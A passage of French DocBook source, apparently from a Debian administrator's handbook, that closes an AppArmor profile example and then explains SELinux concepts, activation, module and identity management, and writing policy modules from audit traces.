  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>Introduction à SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>Les principes</title>

      <para>SELinux <foreignphrase>(Security Enhanced Linux)</foreignphrase> est un système de contrôle d'accès obligatoire <foreignphrase>(Mandatory Access Control)</foreignphrase> qui s'appuie sur l'interface <foreignphrase>Linux Security Modules</foreignphrase> fournie par le noyau Linux. Concrètement, le noyau interroge SELinux avant chaque appel système pour savoir si le processus est autorisé à effectuer l'opération concernée.</para>

      <para>SELinux s'appuie sur un ensemble de règles <foreignphrase>(policy)</foreignphrase> pour autoriser ou interdire une opération. Ces règles sont assez délicates à créer, mais heureusement deux jeux de règles standards (<foreignphrase>targeted</foreignphrase> et <foreignphrase>strict</foreignphrase>) sont fournies pour éviter le plus gros du travail de configuration.</para>

      <para>Le système de permissions de SELinux est totalement différent de ce qu'offre un système Unix traditionnel. Les droits d'un processus dépendent de son <emphasis>contexte de sécurité</emphasis>. Le contexte est défini par l'<emphasis>identité</emphasis> de celui qui a démarré le processus, le <emphasis>rôle</emphasis> et le <emphasis>domaine</emphasis> qu'il avait à ce moment. Les permissions proprement dites dépendent du domaine, mais les transitions entre les domaines sont contrôlées par les rôles. Enfin, les transitions autorisées entre rôles dépendent de l'identité.</para>

      <figure>
        <title>Contextes de sécurité et utilisateurs Unix</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>En pratique, au moment de la connexion, l'utilisateur se voit attribuer un contexte de sécurité par défaut (en fonction des rôles qu'il a le droit d'assumer). Cela fixe le domaine dans lequel il évolue. S'il veut changer de rôle et de domaine associé, il doit employer la commande <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domaine_t</replaceable></command> (il n'y a généralement qu'un seul domaine possible pour un rôle donné et le paramètre <literal>-t</literal> est donc souvent inutile). Cette commande demande à l'utilisateur son mot de passe afin de l'authentifier. Cette caractéristique empêche tout programme de pouvoir changer de rôle de manière automatique. De tels changements ne peuvent avoir lieu que s'ils sont prévus dans l'ensemble de règles.</para>

      <para>Bien entendu, les droits ne s'appliquent pas universellement à tous les <emphasis>objets</emphasis> (fichiers, répertoires, sockets, périphériques, etc.), ils peuvent varier d'un objet à l'autre. Pour cela, chaque objet est associé à un <emphasis>type</emphasis> (on parle d'étiquetage). Les droits des domaines s'expriment donc en termes d'opérations autorisées (ou non) sur ces types (donc implicitement sur tous les objets qui sont marqués avec le type correspondant).</para>

      <sidebar>
        <title><emphasis>COMPLÉMENTS</emphasis> Domaine et type sont équivalents</title>

	<para>En interne, un domaine n'est qu'un type, mais un type qui ne s'applique qu'aux processus. C'est pour cela que les domaines sont suffixés par <literal>_t</literal> tout comme le sont les types affectés aux objets.</para>
      </sidebar>

      <para>Par défaut, un programme exécuté hérite du domaine de l'utilisateur qui l'a démarré. Mais pour la plupart des programmes importants, les règles SELinux standards prévoient de les faire fonctionner dans un domaine dédié. Pour cela, ces exécutables sont étiquetés avec un type dédié (par exemple <command>ssh</command> est étiqueté avec <literal>ssh_exec_t</literal> et lorsque le programme est démarré, il bascule automatiquement dans le domaine <literal>ssh_t</literal>). Ce mécanisme de changement automatique de domaine permet de ne donner que les droits nécessaires au bon fonctionnement de chaque programme et est à la base de SELinux.</para>

      <figure>
        <title>Transitions automatiques entre domaines</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>EN PRATIQUE</emphasis> Connaître le contexte de sécurité</title>
        <indexterm><primary>contexte de sécurité</primary></indexterm>
        <indexterm><primary>sécurité, contexte de</primary></indexterm>
        <indexterm><primary>MCS (<foreignphrase>Multi-Category Security</foreignphrase>)</primary></indexterm>

	<para>Pour connaître le contexte de sécurité appliqué à un processus, il faut employer l'option <literal>Z</literal> de <command>ps</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>

	<para>Le premier champ contient l'identité, le rôle, le domaine et le niveau MCS, séparés par des deux-points. Le niveau MCS <foreignphrase>(Multi-Category Security)</foreignphrase> est un paramètre intervenant dans la mise en place d'une politique de protection de la confidentialité, laquelle restreint l'accès aux fichiers selon leur degré de confidentialité. Cette fonctionnalité ne sera pas abordée dans ce livre.</para>

	<para>Pour connaître le contexte de sécurité actuellement actif dans un terminal de commande, il faut invoquer <command>id -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>Enfin, pour connaître le type affecté à un fichier, on peut employer <command>ls -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>

	<para>Signalons que l'identité et le rôle associé à un fichier n'ont pas d'importance particulière, ils n'interviennent jamais. Mais par souci d'uniformisation, tous les objets se voient attribuer un contexte de sécurité complet.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>La mise en route</title>

      <para>Le code de SELinux est intégré dans les noyaux standards fournis par Debian et les programmes Unix de base le gèrent sans modification. Il est donc relativement simple d'activer SELinux.</para>

      <para>La commande <command>apt install selinux-basics selinux-policy-default</command> installera automatiquement les paquets nécessaires pour configurer un système SELinux.</para>

      <sidebar>
        <title><emphasis>ATTENTION</emphasis> Politique de référence absente de Jessie</title>
        <para>Les responsables du paquet source <emphasis role="pkg">refpolicy</emphasis> n'ont malheureusement pas pu traiter à temps les bogues critiques du paquet, et ce dernier a donc été supprimé de Jessie. En pratique, cela signifie que les paquets <emphasis role="pkg">selinux-policy-*</emphasis> ne sont pas disponibles dans Jessie, et qu'ils doivent être récupérés depuis une autre distribution. Nous espérons qu'ils reviendront dans une version corrective, ou dans les rétroportages. En attendant, vous pouvez les récupérer dans <emphasis role="distribution">Unstable</emphasis>.</para>
        <para>Ce triste constat montre au moins que SELinux n'est pas très populaire parmi les utilisateurs et développeurs qui se servent des versions de développement de Debian. C'est pourquoi, lorsqu'on choisit d'utiliser SELinux, il faut s'attendre à passer un temps non négligeable à l'adapter à ses besoins spécifiques.</para>
      </sidebar>

      <para>Le paquet <command>selinux-policy-default</command> contient un ensemble de règles standards. Par défaut, l'ensemble de règles ne restreint les accès que pour certains services très exposés. Les sessions utilisateur ne sont pas restreintes et il n'y a donc que peu de risques que SELinux bloque des opérations légitimes des utilisateurs. En revanche, cela permet d'apporter un surcroît de sécurité pour les services système fonctionnant sur la machine. Pour obtenir l'équivalent des anciennes règles « strictes », il faut simplement désactiver le module <literal>unconfined</literal> (la gestion des modules est détaillée plus loin).</para>

      <para>Une fois les règles installées, il reste à étiqueter tous les fichiers disponibles (il s'agit de leur affecter un type). C'est une opération qu'il faut déclencher manuellement avec <command>fixfiles relabel</command>.</para>

      <para>Le système SELinux est prêt, il ne reste plus qu'à l'activer. Pour cela, il faut passer le paramètre <literal>selinux=1 security=selinux</literal> au noyau Linux. Le paramètre <literal>audit=1</literal> active les traces SELinux qui enregistrent les différentes opérations qui ont été refusées. Enfin, le paramètre <literal>enforcing=1</literal> permet de mettre en application l'ensemble des règles : en effet, par défaut SELinux fonctionne en mode <foreignphrase>permissive</foreignphrase> où les actions interdites sont tracées mais malgré tout autorisées. Il faut donc modifier le fichier de configuration du chargeur de démarrage GRUB pour ajouter les paramètres désirés. Le plus simple pour cela est de modifier la variable <literal>GRUB_CMDLINE_LINUX</literal> dans <filename>/etc/default/grub</filename> et d'exécuter <command>update-grub</command>. Au démarrage suivant, SELinux sera actif.</para>

      <para>Signalons que le script <command>selinux-activate</command> automatise ces opérations et permet de forcer un étiquetage au prochain redémarrage, ce qui évite d'avoir des fichiers non étiquetés créés alors que SELinux n'était pas encore actif et que l'étiquetage était en cours.</para>
    </section>
    <section id="sect.selinux-management">
      <title>La gestion d'un système SELinux</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>L'ensemble de règles SELinux est modulaire et son installation détecte et active automatiquement tous les modules pertinents en fonction des services déjà installés. Ainsi, le système est immédiatement fonctionnel. Toutefois, lorsqu'un service est installé après les règles SELinux, il faut pouvoir activer manuellement un module de règles. C'est le rôle de la commande <command>semodule</command>. En outre, il faut pouvoir définir les rôles accessibles à chaque utilisateur ; pour cela c'est la commande <command>semanage</command> qu'il faudra utiliser.</para>

      <para>Ces deux commandes modifient donc la configuration SELinux courante qui est stockée dans <filename>/etc/selinux/default/</filename>. Contrairement à ce qui se pratique d'habitude avec les fichiers de configuration de <filename>/etc/</filename>, ces fichiers ne doivent pas être modifiés manuellement. Il faut les manipuler en utilisant les programmes prévus pour cela.</para>

      <sidebar>
        <title><emphasis>POUR ALLER PLUS LOIN</emphasis> Plus de documentation</title>

	<para>SELinux ne disposant d'aucune documentation officielle rédigée par la NSA, la communauté a mis en place un wiki pour combler ce manque criant. Il rassemble beaucoup d'informations mais il faut tenir compte du fait que la majorité des contributeurs utilisant SELinux sont utilisateurs de Fedora (où SELinux est activé par défaut). La documentation a donc tendance à traiter du cas de cette distribution. <ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>On consultera donc également la page dédiée à SELinux du wiki Debian ainsi que le blog de Russelll Coker, un des développeurs Debian les plus actifs sur SELinux. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
      </sidebar>
      <section>
        <title>Gestion des modules SELinux</title>

	<para>Les modules SELinux disponibles sont stockés dans le répertoire <filename>/usr/share/selinux/default/</filename>. Pour activer un de ces modules dans la configuration courante, il faut employer <command>semodule -i <replaceable>module.pp.bz2</replaceable></command>. L'extension <literal>pp.bz2</literal> signifie <foreignphrase>policy package</foreignphrase> que l'on pourrait traduire par « paquet de règles » (comprimé avec bzip2).</para>

	<para>À l'inverse, la commande <command>semodule -r <replaceable>module</replaceable></command> retire un module de la configuration courante. Enfin, la commande <command>semodule -l</command> liste les modules qui sont actuellement installés. La commande inclut également le numéro de version du module.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>

	<para><command>semodule</command> recharge immédiatement la nouvelle configuration, sauf si l'on utilise l'option <literal>-n</literal>. Signalons également que le programme modifie par défaut la configuration courante (celle indiquée par la variable <literal>SELINUXTYPE</literal> dans <filename>/etc/selinux/config</filename>) mais qu'on peut en modifier une autre grâce à l'option <literal>-s</literal>.</para>
      </section>
      <section>
        <title>Gestion des identités</title>

	<para>Chaque fois qu'un utilisateur se connecte, il se voit attribuer une identité SELinux, qui va définir les rôles qu'il va pouvoir assumer. Ces deux correspondances (de l'utilisateur vers l'identité SELinux et de cette identité vers les rôles) se configurent grâce à la commande <command>semanage</command>.</para>

	<para>La lecture de la page de manuel <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> est indispensable, même si la syntaxe de cette commande ne varie guère selon les concepts manipulés. On retrouvera des options communes aux différentes sous-commandes : <literal>-a</literal> pour ajouter, <literal>-d</literal> pour supprimer, <literal>-m</literal> pour modifier, <literal>-l</literal> pour lister et <literal>-t</literal> pour indiquer un type (ou domaine).</para>

	<para><command>semanage login -l</command> liste les correspondances existantes entre identifiants d'utilisateurs et identités SELinux. Si un utilisateur n'a pas de correspondance explicite, il aura l'identité indiquée en face de <literal>__default__</literal>. La commande <command>semanage login -a -s user_u <replaceable>utilisateur</replaceable></command> va associer l'identité <emphasis>user_u</emphasis> à l'utilisateur. Enfin, <command>semanage login -d <replaceable>utilisateur</replaceable></command> va retirer la correspondance affectée à l'utilisateur.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>

	<para><command>semanage user -l</command> liste les correspondances entre identité SELinux et rôles possibles. Ajouter une nouvelle identité nécessite de préciser d'une part les rôles correspondants et d'autre part, un préfixe d'étiquetage qui définira le type affecté aux fichiers personnels (<filename>/home/<replaceable>utilisateur</replaceable>/*</filename>). Le préfixe est à choisir entre <literal>user</literal>, <literal>staff</literal> et <literal>sysadm</literal>. Un préfixe « <literal>staff</literal> » donnera des fichiers typés <literal>staff_home_dir_t</literal>. La commande créant une identité est <command>semanage user -a -R <replaceable>rôles</replaceable> -P <replaceable>préfixe</replaceable> <replaceable>identité</replaceable></command>. Enfin, une identité peut être supprimée avec <command>semanage user -d <replaceable>identité</replaceable></command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
      </section>
      <section>
        <title>Gestion des contextes de fichiers, des ports et des booléens</title>

	<para>Chaque module SELinux fournit un ensemble de règles d'étiquetage des fichiers, mais il est également possible de rajouter des règles d'étiquetage spécifiques afin de les adapter à un cas particulier. Ainsi, pour rendre toute l'arborescence <filename>/srv/www/</filename> accessible au serveur web, on pourrait exécuter <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command>, puis <command>restorecon -R /srv/www/</command>. La première commande enregistre la nouvelle règle d'étiquetage et la seconde restaure les bonnes étiquettes en fonction des règles enregistrées.</para>

	<para>D'une manière similaire, les ports TCP/UDP sont étiquetés afin que seuls les démons correspondants puissent y écouter. Ainsi, si l'on veut que le serveur web puisse également écouter sur le port 8 080, il faut exécuter la commande <command>semanage port -m -t http_port_t -p tcp 8080</command>.</para>

	<para>Les modules SELinux exportent parfois des options booléennes qui influencent le comportement des règles. L'utilitaire <command>getsebool</command> permet de consulter l'état de ces options (<command>getsebool <replaceable>booléen</replaceable></command> affiche une option et <command>getsebool -a</command> les affiche toutes). La commande <command>setsebool <replaceable>booléen</replaceable> <replaceable>valeur</replaceable></command> change la valeur courante d'une option. L'option <literal>-P</literal> rend le changement permanent, autrement dit la nouvelle valeur sera celle par défaut et sera conservée au prochain redémarrage. L'exemple ci-dessous permet au serveur web d'accéder aux répertoires personnels des utilisateurs (utile dans le cas où ils ont des sites web personnels dans <filename>~/public_html/</filename> par exemple).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>L'adaptation des règles</title>

      <para>Puisque l'ensemble des règles (que l'on nomme <foreignphrase>policy</foreignphrase>) est modulaire, il peut être intéressant de développer de nouveaux modules pour les applications (éventuellement spécifiques) qui n'en disposent pas encore, ces nouveaux modules venant alors compléter la <foreignphrase>reference policy</foreignphrase>.</para>

      <para>Le paquet <emphasis role="pkg">selinux-policy-dev</emphasis> sera nécessaire, ainsi que <emphasis role="pkg">selinux-policy-doc</emphasis>. Ce dernier contient la documentation des règles standards (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) et des fichiers exemples permettant de créer de nouveaux modules. Installons ces fichiers pour les étudier de plus près :</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>

      <para>Le fichier <filename>.te</filename> est le plus important : il définit les règles à proprement parler. Le fichier <filename>.fc</filename> définit les « contextes des fichiers », autrement dit les types affectés aux fichiers relatifs à ce module. Les informations du <filename>.fc</filename> sont utilisées lors de l'étiquetage des fichiers sur le disque. Enfin, le fichier <filename>.if</filename> définit l'interface du module ; il s'agit d'un ensemble de « fonctions publiques » qui permettent à d'autres modules de s'interfacer proprement avec celui en cours de création.</para>
      <section>
        <title>Rédiger un fichier <filename>.fc</filename></title>

	<para>La lecture de l'exemple qui suit suffit à comprendre la structure d'un tel fichier. Il est possible d'employer une expression rationnelle pour affecter le même contexte à plusieurs fichiers, voire à toute une arborescence.</para>

        <example>
          <title>Fichier <filename>example.fc</filename></title>

          <programlisting role="scale"># myapp executable will have:
# label: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
        </example>
      </section>
      <section>
        <title>Rédiger un fichier <filename>.if</filename></title>

	<para>Dans l'exemple suivant, la première interface (<literal>myapp_domtrans</literal>) sert à contrôler qui a le droit d'exécuter l'application et la seconde (<literal>myapp_read_log</literal>) fournit un droit de lecture sur les fichiers de logs de l'application.</para>

	<para>Chaque interface doit générer un ensemble correct de règles comme s'il était directement placé dans un fichier <filename>.te</filename>. Il faut donc déclarer tous les types employés (avec la macro <literal>gen_require</literal>) et employer les directives standards pour attribuer des droits. Notons toutefois qu'il est possible d'employer des interfaces fournies par d'autres modules. La prochaine section en dévoilera plus sur la manière d'exprimer ces droits.</para>

        <example>
          <title>Fichier <filename>example.if</filename></title>

          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOCUMENTATION</emphasis> Explications sur la <foreignphrase>reference policy</foreignphrase></title>

	  <para>La <foreignphrase>reference policy</foreignphrase> évolue comme un projet libre au gré des contributions. Le projet est hébergé sur le site de Tresys, une des sociétés les plus actives autour de SELinux. Leur wiki contient des explications sur la structure des règles et sur la manière d'en créer de nouvelles. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>Rédiger un fichier <filename>.te</filename></title>

	<para>Analysons le contenu du fichier <filename>example.te</filename> :</para>

        <sidebar>
          <title><emphasis>POUR ALLER PLUS LOIN</emphasis> Langage de macro <command>m4</command></title>

	  <para>Pour structurer proprement l'ensemble des règles, les développeurs de SELinux se sont appuyés sur un langage de création de macro-commandes. Au lieu de répéter à l'infini des directives <emphasis>allow</emphasis> très similaires, la création de fonctions « macro » permet d'utiliser une logique de plus haut niveau et donc de rendre l'ensemble de règles plus lisible.</para>

	  <para>Dans la pratique, la compilation des règles va faire appel à l'outil <command>m4</command> pour effectuer l'opération inverse : à partir des directives de haut niveau, il va reconstituer une grande base de données de directives <emphasis>allow</emphasis>.</para>

	  <para>Ainsi, les « interfaces » ne sont rien que des fonctions macro qui vont être remplacées par un ensemble de règles au moment de la compilation. De même, certaines permissions sont en réalité des ensembles de permissions qui sont remplacées par leur valeur au moment de la compilation.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>Le module doit être identifié par son nom et par son numéro de version. Cette directive est requise.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>Si le module introduit de nouveaux types, il doit les déclarer avec des directives comme celle-ci. Il ne faut pas hésiter à créer autant de types que nécessaires, plutôt que distribuer trop de droits inutiles.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>Ces interfaces précisent que le type <literal>myapp_t</literal> est prévu pour être un domaine de processus et qu'il doit être employé pour tout exécutable étiqueté par <literal>myapp_exec_t</literal>. Implicitement, cela ajoute un attribut <literal>exec_type</literal> sur ces objets. Sa présence permet à d'autres modules de donner le droit d'exécuter ces programmes : ainsi, le module <literal>userdomain</literal> va permettre aux processus de domaine <literal>user_t</literal>, <literal>staff_t</literal> et <literal>sysadm_t</literal> de les exécuter. Les domaines d'autres applications confinées n'auront pas le droit de l'exécuter, sauf si les règles prévoient des droits similaires (c'est le cas par exemple pour <command>dpkg</command> avec le domaine <literal>dpkg_t</literal>).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> est une interface fournie par la <foreignphrase>reference policy</foreignphrase> qui sert à indiquer que les fichiers étiquetés avec le type précisé en paramètre sont des fichiers de logs et doivent bénéficier des droits associés (par exemple ceux permettant à <command>logrotate</command> de les manipuler).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para>La directive <literal>allow</literal> est la directive de base qui permet d'autoriser une opération. Le premier paramètre est le domaine du processus qui sera autorisé à effectuer l'opération. Le second décrit l'objet qu'un processus du domaine aura le droit de manipuler. Ce paramètre prend la forme « <replaceable>type</replaceable>:<replaceable>genre</replaceable> » où <replaceable>type</replaceable> est son type SELinux et où <replaceable>genre</replaceable> décrit la nature de l'objet (fichier, répertoire, socket, fifo, etc.). Enfin, le dernier paramètre décrit les permissions (les opérations qui sont autorisées).</para>

	    <para>Les permissions se définissent comme des ensembles d'opérations autorisées et prennent la forme <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. Il est également possible d'employer des macros qui correspondent aux ensembles de permissions les plus utiles. Le fichier <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> permet de les découvrir.</para>

	    <para>La page web suivante fournit une liste relativement exhaustive des genres d'objet <foreignphrase>(object classes)</foreignphrase> et des permissions que l'on peut accorder : <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>Il ne reste plus qu'à trouver l'ensemble minimal des règles nécessaires au bon fonctionnement du service ou de l'application ciblé(e) par le module. Pour cela, il est préférable de bien connaître le fonctionnement de l'application et d'avoir une idée claire des flux de données qu'elle gère et/ou génère.</para>

	<para>Toutefois, une approche empirique est possible. Une fois les différents objets impliqués correctement étiquetés, on peut utiliser l'application en mode permissif : les opérations normalement interdites sont tracées mais réussissent tout de même. Il suffit alors d'analyser ces traces pour identifier les opérations qu'il faut autoriser. Voici à quoi peut ressembler une de ces traces :</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>

	<para>Pour mieux comprendre ce message, analysons-le bout par bout.</para>

        <table colsep="1">
          <title>Analyse d'une trace SELinux</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>Message</entry>
                <entry>Description</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry><computeroutput>avc: denied</computeroutput></entry>
                <entry>Une opération a été refusée.</entry>
              </row>
              <row>
                <entry><computeroutput>{ read write }</computeroutput></entry>
                <entry>Cette opération requérait les permissions <literal>read</literal> et <literal>write</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>pid=1876</computeroutput></entry>
                <entry>Le processus ayant le PID 1876 a exécuté l'opération (ou essayé de l'exécuter).</entry>
              </row>
              <row>
                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
                <entry>Le processus était une instance de la commande <literal>syslogd</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>name="xconsole"</computeroutput></entry>
                <entry>L'objet visé s'appelait <literal>xconsole</literal>. Dans certains cas on peut aussi avoir une variable « path », avec un chemin d'accès complet.</entry>
              </row>
              <row>
                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
                <entry>Le périphérique stockant l'objet est de type <literal>tmpfs</literal>. Pour un disque réel, nous pourrions voir la partition contenant l'objet (exemple : « sda3 »).</entry>
              </row>
              <row>
                <entry><computeroutput>ino=5510</computeroutput></entry>
                <entry>L'objet est identifié par le numéro d'inode 5510.</entry>
              </row>
              <row>
                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
                <entry>C'est le contexte de sécurité courant du processus qui a exécuté l'opération.</entry>
              </row>
              <row>
                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
                <entry>C'est le contexte de sécurité de l'objet cible.</entry>
              </row>
              <row>
                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
                <entry>L'objet cible est un fichier FIFO.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>Ainsi, il est possible de fabriquer une règle qui va autoriser cette opération, cela donnerait par exemple <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. Ce processus est automatisable et c'est ce que propose la commande <command>audit2allow</command> du paquet <emphasis role="pkg">policycoreutils</emphasis>. Une telle démarche ne sera utile que si les objets impliqués sont déjà correctement étiquetés selon ce qu'il est souhaitable de cloisonner. Dans tous les cas, il faudra relire attentivement les règles pour les vérifier et les valider par rapport à votre connaissance de l'application. En effet, bien souvent cette démarche donnera des permissions plus larges que nécessaires. La bonne solution est souvent de créer de nouveaux types et d'attribuer des permissions sur ces types uniquement. Il arrive également qu'un échec sur une opération ne soit pas fatal à l'application, auquel cas il peut être préférable d'ajouter une règle <literal>dontaudit</literal> qui supprime la génération de la trace malgré le refus effectif.</para>

        <sidebar>
          <title><emphasis>COMPLÉMENTS</emphasis> Pas de rôle dans les règles</title>
          <indexterm><primary>type, application de types</primary></indexterm>
          <indexterm><primary>application de types</primary></indexterm>

	  <para>On peut s'étonner que les rôles n'interviennent à aucun moment dans la création des règles. SELinux emploie uniquement les domaines pour savoir quelles opérations sont permises. Le rôle n'intervient qu'indirectement en permettant à l'utilisateur d'accéder à un autre domaine. SELinux en tant que tel est basé sur une théorie connue sous le nom de <foreignphrase>Type Enforcement</foreignphrase> (Application de types) et le type (ou domaine) est le seul élément qui compte dans l'attribution des droits.</para>
        </sidebar>
      </section>
      <section>
